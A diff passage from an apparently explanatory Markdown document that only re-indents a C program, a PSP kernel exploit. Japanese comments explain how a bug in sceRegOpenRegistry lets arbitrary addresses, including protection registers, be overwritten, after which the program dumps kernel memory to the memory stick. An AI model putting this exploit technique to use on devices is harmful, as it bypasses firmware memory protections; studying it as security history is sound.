@@ -52,22 +52,22 @@ PSP_MAIN_THREAD_ATTR(THREAD_ATTR_USER | THREAD_ATTR_VFPU);
 int done = 0;
 int main(void)
 {
-pspDebugScreenInit();
-printf("starting the exploit..\n");
-sceRegOpenRegistry(0, 0, (void *) 0xbc000000); // この関数にバグあり
-sceRegOpenRegistry(0, 0, (void *) 0xbc000004); // 最後の引数は整数へのポインタを期待している。
-sceRegOpenRegistry(0, 0, (void *) 0xbc000008); // しかし、保護レジスタなどの明らかに誤った値でも
-sceRegOpenRegistry(0, 0, (void *) 0xbc00000c); // ハンドラは有効なポインタおして値を書き込んでしまう。
-sceRegOpenRegistry(0, 0, (void *) 0xbc000010); // よって、ハッカーは好みのアドレスに0xffffffを書き込めてしまう
-sceRegOpenRegistry(0, 0, (void *) 0xbc000014); // そのため、0xBC000000（DDRレジスタアドレス）以降をすべて0xffffffで埋める
-sceRegOpenRegistry(0, 0, (void *) 0xbc000018); // この脆弱性からPSPの一挙手一投足まで解析されて行ってしまった。
-sceRegOpenRegistry(0, 0, (void *) 0xbc00001c);
-int fd = sceIoOpen("ms0:/kmem.bin",PSP_O_CREAT|PSP_O_WRONLY,0777);
-sceIoWrite(fd,(void*)0x08000000,4*1024*1024);
-sceIoClose(fd);
-printf("done see ms0:/kmem.bin!!\n");
-sceKernelSleepThreadCB();
-return 0;
+    pspDebugScreenInit();
+    printf("starting the exploit..\n");
+    sceRegOpenRegistry(0, 0, (void *) 0xbc000000); // この関数にバグあり
+    sceRegOpenRegistry(0, 0, (void *) 0xbc000004); // 最後の引数は整数へのポインタを期待している。
+    sceRegOpenRegistry(0, 0, (void *) 0xbc000008); // しかし、保護レジスタなどの明らかに誤った値でも
+    sceRegOpenRegistry(0, 0, (void *) 0xbc00000c); // ハンドラは有効なポインタおして値を書き込んでしまう。
+    sceRegOpenRegistry(0, 0, (void *) 0xbc000010); // よって、ハッカーは好みのアドレスに0xffffffを書き込めてしまう
+    sceRegOpenRegistry(0, 0, (void *) 0xbc000014); // そのため、0xBC000000（DDRレジスタアドレス）以降をすべて0xffffffで埋める
+    sceRegOpenRegistry(0, 0, (void *) 0xbc000018); // この脆弱性からPSPの一挙手一投足まで解析されて行ってしまった。
+    sceRegOpenRegistry(0, 0, (void *) 0xbc00001c);
+    int fd = sceIoOpen("ms0:/kmem.bin",PSP_O_CREAT|PSP_O_WRONLY,0777);
+    sceIoWrite(fd,(void*)0x08000000,4*1024*1024);
+    sceIoClose(fd);
+    printf("done see ms0:/kmem.bin!!\n");
+    sceKernelSleepThreadCB();
+    return 0;
 }
 ```
 
